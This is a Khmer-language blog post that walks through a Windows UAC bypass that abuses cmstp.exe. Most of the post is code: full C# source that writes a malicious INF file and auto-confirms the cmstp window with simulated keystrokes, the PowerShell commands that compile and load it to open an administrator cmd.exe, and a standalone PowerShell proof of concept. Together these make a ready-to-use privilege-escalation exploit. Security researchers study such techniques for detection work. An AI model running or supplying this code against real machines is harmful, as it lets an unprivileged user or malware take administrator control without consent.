---
title: "Bypass UAC DLL Method"
date: 2022-12-03T02:00:06+07:00
description: បង្កើតស្គ្រីប powershell ដើម្បី Bypass UAC ជាមួយឯកសារ DLL
draft: false
hideToc: false
enableToc: false
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- dll
- bypass
categories:
- UAC
series:
- WinExE
image: images/feature2/article-1.png
---

ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា [dll reflection](https://github.com/stephenfewer/ReflectiveDLLInjection) ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។


#### C# DLL Reflection Code

{{< highlight csharp "linenos=table" >}}
/* 
UAC Bypass using CMSTP.exe microsoft binary.
Code author: Andre Marques (@_zc00l)
*/
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
    // Our .INF file data!
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = "C:\\windows\\temp";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));

        Console.WriteLine("Payload file written to " + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
{{< / highlight >}}


<span style="color:grey">ផ្អែកលើការងារពីមុនរបស់លោក</span> [Oddvar Moe](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/)
<span style="color:grey">ផ្អែកលើ PowerShell ស្គ្រីបរបស់លោក</span> [Tyler Applebaum](https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1)

ចម្លងកូដខាងលើរក្សាទុកជា <span style="color:red">"Source.cs"</span>
ដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖

{{< highlight powershell "linenos=table" >}}
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
{{< / highlight >}}

ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា <span style="color:red">"CMSTP-UAC-Bypass.dll"</span>

#### Bypass UAC

ដើម្បីប្រើប្រាស់ឯកសារ DLL ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight powershell "linenos=table" >}}
PS C:\> [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))

GAC    Version        Location
---    -------        --------
False  v4.0.30319

PS C:\> [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
{{< / highlight >}}

ក្រោយពីរដំណើររួច នឹងមានលោតផ្ទាំង CMD អមមកជាមួយនិងសិទ្ធជា Administrator ។

![Bypass UAC](/en/posts/img/2022/12/bypass-uac-dll/bypass-uac-cmstp.png)

ដូចដែលបានឃើញគឺយើងអាចធ្វើការ Bypass UAC បានសម្រេចដោយឈរនៅលើសិទ្ធិអ្នកប្រើប្រាស់ធម្មតា៕

#### Bonus - Bypass With PS1 (One File Action)

{{< highlight powershell "linenos=table" >}}
# UAC Bypass poc using SendKeys
# Version 1.0
# Author: Oddvar Moe
# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
# Todo: Hide window on screen for stealth
# Todo: Make script edit the INF file for command to inject...


Function script:Set-INFFile {
[CmdletBinding()]
	Param (
	[Parameter(HelpMessage="Specify the INF file location")]
	$InfFileLocation = "$env:temp\CMSTP.inf",
	
	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' #your action here
	)

$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
$CommandToExecute
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

$InfContent | Out-File $InfFileLocation -Encoding ASCII
}


Function Get-Hwnd
{
  [CmdletBinding()]
    
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = 'Stop'
        Try 
        {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            $hwnd = $null
        }
        $hash = @{
        ProcessName = $ProcessName
        Hwnd        = $hwnd
        }
        
    New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive
{
  [CmdletBinding()]

  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  
  Process
  {
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@

    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
    If ($hwnd) 
    {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)
      [User32.Api]::ShowWindow($hwnd, 5)
    }
    Else 
    {
      [string] $hwnd = 'N/A'
    }

    $hash = @{
      Process = $Name
      Hwnd    = $hwnd
    }
        
    New-Object -TypeName PsObject -Property $hash
  }
}

. Set-INFFile
#Needs Windows forms
add-type -AssemblyName System.Windows.Forms
If (Test-Path $InfFileLocation) {
#Command to run
$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
$ps.Arguments = "/au $InfFileLocation"
$ps.UseShellExecute = $false

#Start it
[system.diagnostics.process]::Start($ps)

do
{
	# Do nothing until cmstp is an active window
}
until ((Set-WindowActive cmstp).Hwnd -ne 0)


#Activate window
Set-WindowActive cmstp

#Send the Enter key
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
{{< / highlight >}}

<b>ឯកសារដើម៖</b>
- [https://0x00-0x00.github.io](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
- [tylerapplebaum](https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1)
